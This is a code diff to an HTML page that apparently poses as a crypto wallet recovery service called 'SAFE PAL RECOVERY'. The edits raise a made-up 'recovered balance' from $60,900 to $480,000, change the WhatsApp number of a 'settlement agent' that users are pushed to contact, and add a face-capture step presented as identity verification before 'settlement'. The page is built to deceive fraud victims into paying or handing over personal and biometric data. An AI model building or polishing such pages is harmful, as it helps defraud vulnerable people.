@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SAFE PAL RECOVERY -Wallet Restoration</title>
+    <title>SAFE PAL RECOVERY - Professional Wallet Restoration</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
@@ -171,7 +171,7 @@
                 <div class="relative z-10 space-y-6">
                     <div>
                         <p class="text-slate-400 font-bold uppercase tracking-[0.4em] text-xs">Total Recovered Balance</p>
-                        <h2 class="text-8xl font-bold tracking-tighter leading-none">$60,900.00</h2>
+                        <h2 class="text-8xl font-bold tracking-tighter leading-none">$480,000.00</h2>
                         <p class="text-blue-500 font-mono mt-2 uppercase tracking-widest text-sm">Status: Pending Settlement</p>
                     </div>
                     <div class="pt-10 flex gap-6">
@@ -195,7 +195,7 @@
                                     <p class="text-slate-500 text-sm font-bold tracking-widest uppercase mt-1">Found via Blockchain Deep Scan</p>
                                 </div>
                             </div>
-                            <span class="text-2xl font-bold text-blue-400">+$60,900.00</span>
+                            <span class="text-2xl font-bold text-blue-400">+$480,000.00</span>
                         </div>
                     </div>
                 </div>
@@ -274,7 +274,7 @@
                         <input type="text" id="withdraw-addr" placeholder="Enter your public address" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-sm font-mono focus:outline-none focus:border-blue-500 transition-colors">
                     </div>
                     <button onclick="startWithdrawVerification()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg uppercase tracking-widest">
-                        VERIFY & SETTLE
+                        CONTINUE TO VERIFICATION
                     </button>
                 </div>
             </div>
@@ -316,7 +316,7 @@
                 </div>
                 
                 <div class="flex flex-col gap-4">
-                    <a href="https://wa.me/+17015186535" target="_blank" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl flex items-center justify-center gap-2 shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-all">
+                    <a href="https://wa.me/+16015950585" target="_blank" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl flex items-center justify-center gap-2 shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-all">
                         <i data-lucide="message-square" class="w-5 h-5"></i> CONTACT SETTLEMENT AGENT
                     </a>
                     <button onclick="closeWithdraw()" class="text-slate-500 text-xs font-bold uppercase tracking-widest hover:text-white transition-colors">Return to Vault</button>
@@ -358,6 +358,9 @@
             if (mode === 'withdraw') {
                 document.getElementById('face-title').innerText = "Final Confirmation";
                 document.getElementById('face-desc').innerText = "Verify identity to authorize final settlement";
+                // Show capture button if it was hidden
+                document.getElementById('capture-btn').classList.remove('hidden');
+                document.getElementById('scanning-msg').classList.add('hidden');
             }
 
             try {
